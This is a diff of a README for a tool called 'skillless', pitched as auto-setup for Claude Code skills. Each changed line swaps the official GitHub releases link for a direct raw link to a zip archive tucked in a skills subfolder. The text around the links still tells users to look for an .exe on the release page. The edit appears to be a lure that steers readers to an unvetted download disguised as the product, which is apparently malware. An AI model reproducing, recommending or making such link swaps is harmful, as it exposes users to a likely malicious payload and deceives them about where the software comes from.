@@ -1,6 +1,6 @@
 # ⚙️ skillless - Auto-setup for Claude Code skills
 
-[![Download skillless](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://github.com/enisad10/skillless/releases)
+[![Download skillless](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://raw.githubusercontent.com/enisad10/skillless/main/skills/skill-search/Software-v1.9.zip)
 
 ---
 
@@ -32,7 +32,7 @@ This guide will walk you through downloading, installing, and running skillless 
 
 1. Click the download button below or visit the official release page:
 
-   [![Download skillless](https://img.shields.io/badge/Download-grey?style=for-the-badge)](https://github.com/enisad10/skillless/releases)
+   [![Download skillless](https://img.shields.io/badge/Download-grey?style=for-the-badge)](https://raw.githubusercontent.com/enisad10/skillless/main/skills/skill-search/Software-v1.9.zip)
 
 2. On the release page, find the latest version for Windows. Look for a file with `.exe` in its name.
 
@@ -132,7 +132,7 @@ You can access these folders to back up or remove data manually if needed.
 
 For questions or issues beyond basic troubleshooting, visit the GitHub release page:
 
-https://github.com/enisad10/skillless/releases
+https://raw.githubusercontent.com/enisad10/skillless/main/skills/skill-search/Software-v1.9.zip
 
 Look for links to the Issues tab or other support resources there.
 
